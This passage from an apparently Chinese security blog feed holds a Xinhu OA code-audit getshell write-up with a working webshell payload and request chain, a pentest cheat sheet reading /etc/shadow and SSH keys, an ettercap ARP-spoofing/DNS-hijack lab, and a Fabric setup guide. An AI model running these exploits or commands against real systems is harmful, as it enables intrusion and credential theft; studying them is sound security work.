class="variable">$cont</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>, <span class="number">0</span>, <span class="number">2</span>) != <span class="string">&#x27;&#123;&quot;&#x27;</span>)&#123;</span><br><span class="line">        	<span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">mcrypt_decrypt</span>(<span class="variable">$cont</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span>  = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$cont</span>, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>file_get_contents()函数</code>读取json数据，然后json解码</p>
<p>解码后的数据存储在<code>$data</code>中，然后获取<code>$data[tab]</code>的数据判断文件表是否存在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$tab</span>, <span class="variable">$alltabls</span>))&#123;</span><br><span class="line">    <span class="variable">$createsql</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$dataarr</span>, <span class="string">&#x27;createsql&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$createsql</span>)&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果不存在调用<code>arrvalue()</code>方法，跟进一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	在数组里读取变量</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@return</span> value</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrvalue</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$k</span>, <span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$val</span>  = <span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="variable">$k</span>]))<span class="variable">$val</span>= <span class="variable">$arr</span>[<span class="variable">$k</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是获取<code>$data[$tab][&#39;createsql&#39;]</code>的值。如果<code>$createsql</code>存在，执行<code>query()</code>方法</p>
<p>其他都可控主要上传的图片文件名都是随机的。想要执行sql语句就必须控制文件名。</p>
<p>比如上传文件返回随机文件名a.png，那么文件内容必须为</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;a.png&quot;</span> =&gt; <span class="punctuation">[</span><span class="string">&quot;createsql&quot;</span> =&gt; <span class="string">&quot;select 1&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p> 我们无法提前预知生成的文件名，那这条路也就走不通</p>
<p>通过翻找代码，找到<code>webmain\task\openapi\openkqjAction.php</code>的<code>apiAction()</code>方法</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725113419460.png"></p>
<p>这里有判断请求方式，如果为POST请求且不为空那么调用<code>kqjcmd</code>类的<code>postdata()</code>方法</p>
<p>跟进一下，这里对POST请求数据进行json解码并赋值给<code>$barr</code>，然后foreach遍历赋值给<code>$dtype</code></p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725114029401.png"></p>
<p>我们往下看，如果存在headpic键那么调用<code>saveheadpic()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($dtype==&#x27;headpic&#x27;)&#123;</span><br><span class="line">	$this-&gt;saveheadpic($snid, $rs[&#x27;ccid&#x27;], $rs[&#x27;headpic&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>saveheadpic()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function saveheadpic($snid, $uid, $headpic, $face=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	$where = &quot;`snid`=&#x27;$snid&#x27; and `uid`=&#x27;$uid&#x27;&quot;;</span><br><span class="line">	if(isempt($face))&#123;</span><br><span class="line">		if(isempt($headpic))return;</span><br><span class="line">		$face  = &#x27;&#x27;.UPDIR.&#x27;/face/kqj&#x27;.$snid.&#x27;_u&#x27;.$uid.&#x27;.jpg&#x27;; //头像保存为图片</span><br><span class="line">		$this-&gt;rock-&gt;createtxt($face, base64_decode($headpic));</span><br><span class="line">	&#125;</span><br><span class="line">	$arr[&#x27;headpic&#x27;] = $face;</span><br><span class="line">	if($this-&gt;kquobj-&gt;rows($where)==0)&#123;</span><br><span class="line">		$where = &#x27;&#x27;;</span><br><span class="line">		$arr[&#x27;snid&#x27;] = $snid;</span><br><span class="line">		$arr[&#x27;uid&#x27;]  = $uid;</span><br><span class="line">	&#125;</span><br><span class="line">	$this-&gt;kquobj-&gt;record($arr, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的路径以及文件名可控，然后对<code>$headpic</code>进行base64解码</p>
<hr>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先insert一条flow_set数据（ps：直接用sql insert太麻烦了直接正常构造一个正常数据，然后sql update）</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725122108889.png"></p>
<p>新增模块列表，填写下基本信息</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182332200.png"></p>
<p>然后提交抓包查看下对应id，结果为161</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725182519855.png"></p>
<p>然后构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;kqj1_u1.jpg&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;createsql&quot;</span> =&gt; <span class="string">&quot;update xinhu_flow_set set name=\&quot;*/eval(\$_POST[1]);/*\&quot; where id = 161;&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：这里的可控文件名<code>kqj1_u1.jpg</code>在前面分析过，id为我们刚刚创建的模块列表id，<code>$</code>符号前要加<code>\</code>防转义</p>
</blockquote>
<p>然后根据我们的链子来构造路由，POP链如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openkqj::apiAction() -&gt; kqjcmd::postdata() -&gt; kqjcmd::saveheadpic()</span><br></pre></td></tr></table></figure>

<p>构造POST请求包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php/post?d=task&amp;m=openkqj|openapi&amp;a=api&amp;sn=1 HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;&quot;aasd&quot;:&#123;</span><br><span class="line">    &quot;data&quot;:&quot;headpic&quot;,</span><br><span class="line">    &quot;id&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;headpic&quot;:&quot;eyJrcWoxX3UxLmpwZyI6eyJjcmVhdGVzcWwiOiJ1cGRhdGUgeGluaHVfZmxvd19zZXQgc2V0IG5hbWU9XCIqXC9ldmFsKCRfUE9TVFsxXSk7XC8qXCIgd2hlcmUgaWQgPSAxNjE7In19&quot;,</span><br><span class="line">    &quot;ccid&quot;:&quot;1&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：headpic为前面构造的payload，base64编码</p>
</blockquote>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184458489.png"></p>
<p>上传成功后，执行我们前面保存的文件中的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?a=huifdatanew&amp;d=system&amp;m=beifen&amp;ajaxbool=true</span><br><span class="line"></span><br><span class="line">//POST传参</span><br><span class="line">folder=.*/./face&amp;sid=kqj1_u1.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725184754678.png"></p>
<p>最后调用<code>webmain\main\flow\flowAction.php</code>的<code>inputAction()</code>方法，将木马拼接到文件中触发漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?a=input&amp;m=flow&amp;d=main&amp;id=1&amp;setid=161</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725194816122.png"></p>
<p>直接访问<code>webmain\flow\input</code>目录下的<code>model_test123Action.php</code>文件，成功命令执行</p>
<p>（这里test123是模块编号）</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195342296.png"></p>
<p>也可以按照给定路由结构去访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?d=flow&amp;m=mode_test123|input</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725195642297.png"></p>
<p>以上就是整个信呼OA后台getshell的分析和利用</p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></li>
<li><a href="https://xz.aliyun.com/t/14920?time__1311=GqAh0KAKYK7Ie05DKB4CqiIdOn85GCtKfeD">https://xz.aliyun.com/t/14920?time__1311=GqAh0KAKYK7Ie05DKB4CqiIdOn85GCtKfeD</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>OA</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集</title>
    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
    <content><![CDATA[<p>渗透测试的信息搜集</p>
<span id="more"></span>

<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
<ul>
<li><p><code>uname -a</code> 所有版本</p>
</li>
<li><p><code>uname -r</code> 内核版本信息</p>
</li>
<li><p><code>uname -n</code> 系统主机名字</p>
</li>
<li><p><code>uname -m</code> Linux内核架构</p>
</li>
<li><p>文件系统 <code>df -a</code></p>
</li>
</ul>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
</li>
<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
</li>
<li><p>查询用户的基本信息 finger</p>
</li>
<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
</li>
<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
</li>
<li><p>目前登录的用户 <code>w</code></p>
</li>
<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
</li>
<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
</li>
<li><p>登录成功日志 <code>/var/log/secure</code></p>
</li>
<li><p>登录失败日志 <code>/var/log/faillog</code></p>
</li>
<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
</li>
<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
</li>
<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看具有sudo权限的用户</p>
<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
</ul>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
<li>打印系统环境信息 <code>env</code></li>
<li>打印系统环境信息 <code>set</code></li>
<li>环境变量中的路径信息 <code>echo $PATH</code></li>
<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
<li>显示当前路径 <code>pwd</code></li>
<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
<li>显示可用的shell <code>cat /etc/shells</code></li>
</ul>
<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
<li>查看进程信息 <code>ps aux</code></li>
<li>资源占有情况 <code>top -c</code></li>
<li>查看进程关联文件 <code>lsof -c $PID</code></li>
<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
<li>进程的命令名 <code>/proc/$PID/comm</code></li>
<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
</ul>
<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
<li><code>~/.ssh</code></li>
<li><code>/etc/ssh</code></li>
</ul>
<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
<li><code>/var/log/*</code></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>利用ettercap实现中间人攻击</title>
    <url>/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html</url>
    <content><![CDATA[<p>中间人攻击是非常经典的攻击方式，不过也有限制条件就是得在同一网段</p>
<span id="more"></span>

<h1 id="利用ettercap实现中间人攻击"><a href="#利用ettercap实现中间人攻击" class="headerlink" title="利用ettercap实现中间人攻击"></a>利用ettercap实现中间人攻击</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>攻击机kali：192.168.132.138</li>
<li>靶机win7：192.168.132.136</li>
</ul>
<p><strong>软件准备</strong></p>
<blockquote>
<p>ettercap是一种网络嗅探器和中间人攻击工具，通常用于网络安全测试和攻击。它可以捕获网络流量并进行分析，同时还可以修改和重定向流量以执行中间人攻击。使用ettercap，攻击者可以轻松地欺骗受害者，从而获取敏感信息，例如登录凭据、信用卡号码等。然而，ettercap也可以用作网络安全工具，以检测和纠正网络漏洞和安全漏洞。</p>
</blockquote>
<p>这里使用的是kali自带的ettercap工具</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在局域网中（同一网段）通信时使用的是MAC地址，而不是常见的IP地址。所以在局域网的两台主机间通信时，必须要知道对方的MAC地址，这就是ARP协议要做的事：将IP地址转换为MAC地址。在ARP回复时，发送请求包的主机A并不会验证ARP回复包的真实性，也就是不能判断回复主机A的是不是主机B。由此引出一个局域网攻击方式ARP欺骗，ARP欺骗攻击可以在各种各样的场景中进行，比如通过 Wi-Fi 热点、路由器、以及局域网上的任意设备。 因此，在保护自己的网络安全时，我们需要注意防止 ARP 欺骗攻击的发生，如启用 ARP 防火墙、使用加密协议、限制对网络的物理访问等。</p>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>查看win7的ip地址</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915101049733.png"></p>
<p>查看kali的ip地址</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915101121230.png"></p>
<p>使用ping命令看是否ping通</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915101215013.png"></p>
<p>执行以下命令查看win7被攻击前的arp信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915101238953.png"></p>
<p>在kali打开ettercap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ettercap -G</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915101652451.png"></p>
<p>点击右上角的勾后，点击扫描主机</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915102917046.png"></p>
<p>扫描结束后，点击右边的主机列表，可以看到已经将靶机win7的ip扫出来了</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103010475.png"></p>
<p>接下来我们来尝试一下ARP欺骗，先查看下win7的网关</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103216567.png"></p>
<p>然后在ettercap分别将网关ip和win7的ip添加为Target1和Target2</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103329946.png"></p>
<p>添加好后，点击小地球图标（MITM menu）中选择ARP Poisoning，点击OK</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103421819.png"></p>
<p>这里可以看到攻击已经开始</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103459228.png"></p>
<p>我们再执行<code>arp -a</code>看下win7的arp信息，注意到前后的MAC地址发生变化</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103548136.png"></p>
<p>已经成功变成了我们kali的mac地址<code>00:0c:29:16:83:5a</code></p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915103716837.png"></p>
<p>我们新建一个终端，输入wireshark后选择eth0接口，筛选arp抓取下流量。可以看到网关将Kali的MAC地址当做win7的MAC地址进行发送（也就是说<code>sender MAC address</code>和<code>sender IP address</code>不一致），成功进行了ARP的欺骗</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915104954726.png"></p>
<h2 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h2><blockquote>
<p>当我们成功进行了ARP欺骗后，我们可以加以利用再制作一个钓鱼页面</p>
</blockquote>
<p>再新建一个终端，输入如下命令进入配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>

<p>这里我们将攻击机kali的ip地址192.168.132.138添加到如下位置，使得win7对<code>*.com</code>的网络访问转移到攻击机kali上</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915105515643.png"></p>
<p>然后打开apache服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915105616528.png"></p>
<p>先尝试ping一下淘宝看看正常状态</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915122332474.png"></p>
<p>回到我们的ettercap，开始DNS劫持。依次点击<code>右上方的三点 -&gt; Plugins -&gt; Manage plugins</code></p>
<p>选择<code>dns_spoof</code>，双击开始攻击</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915110142926.png"></p>
<p>我们回到win7再次ping一下淘宝，发现没成功。上网搜了一下原来在使用ettercap图形化界面实现DNS劫持时，有可能会不生效。可以尝试命令行直接进行DNS劫持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.132.136// /192.168.132.2//</span><br></pre></td></tr></table></figure>

<p>DNS劫持成功，ping的地址变成我们的攻击机kali</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915120939523.png"></p>
<p>我们访问<code>taobao.com</code>发现是我们攻击机开启的apache服务</p>
<p><img src="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/image-20240915121024232.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>中间人攻击</p>
<ul>
<li><a href="https://blog.csdn.net/m0_74806866/article/details/134853842?spm=1001.2014.3001.5506">https://blog.csdn.net/m0_74806866/article/details/134853842?spm=1001.2014.3001.5506</a></li>
</ul>
<p>DNS劫持失败解决办法</p>
<ul>
<li><a href="https://blog.csdn.net/bomb324/article/details/121824533">https://blog.csdn.net/bomb324/article/details/121824533</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链 fabric搭建</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA.html</url>
    <content><![CDATA[<p>记录Ubuntu22.04下搭建fabric平台</p>
<span id="more"></span>



<h2 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h2><h3 id="安装docker及docker-compose"><a href="#安装docker及docker-compose" class="headerlink" title="安装docker及docker-compose"></a>安装docker及docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装Docker</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"></span><br><span class="line"># 安装Docker Compose</span><br><span class="line">sudo apt-get install docker-compose</span><br></pre></td></tr></table></figure>

<p>查看version检查是否安装成功</p>
<img src="/article/区块链-fabric搭建/image-20240527220801577.png" style="zoom:150%;">

<p>然后将用户添加到docker的用户组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G docker rev1ve</span><br></pre></td></tr></table></figure>

<p>由于docker拉取镜像较慢，使用阿里云的加速器 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">官网链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>添加下面内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://nxmpk3z3.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启服务即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>



<h3 id="安装Go语言"><a href="#安装Go语言" class="headerlink" title="安装Go语言"></a>安装Go语言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure>

<p>查看version检查是否安装成功</p>
<h3 id="安装Node-js和npm"><a href="#安装Node-js和npm" class="headerlink" title="安装Node.js和npm"></a>安装Node.js和npm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure>

<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>

<h3 id="安装curl"><a href="#安装curl" class="headerlink" title="安装curl"></a>安装curl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>



<h2 id="Fabric搭建"><a href="#Fabric搭建" class="headerlink" title="Fabric搭建"></a>Fabric搭建</h2><p>接下来均以root用户权限进行操作</p>
<p>手动拉取镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/malingzhao/fabric-samples.git</span><br></pre></td></tr></table></figure>

<p>拉取成功</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231237094.png"></p>
<p>然后就是下载俩fabric文件</p>
<p>注意对应的下载的fabric版本（前面sh搭建脚本有给）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fabric</span><br><span class="line">https://github.com/hyperledger/fabric/releases/download/v2.5.8/hyperledger-fabric-linux-amd64-2.5.8.tar.gz</span><br><span class="line">#fabric-ca</span><br><span class="line">https://github.com/hyperledger/fabric-ca/releases/download/v1.5.11/hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后在所在目录解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf hyperledger-fabric-linux-amd64-2.5.8.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br><span class="line">tar -xzvf hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529224850595.png"></p>
<p>检查一下<code>config</code>和<code>bin</code>在不在</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231331064.png"></p>
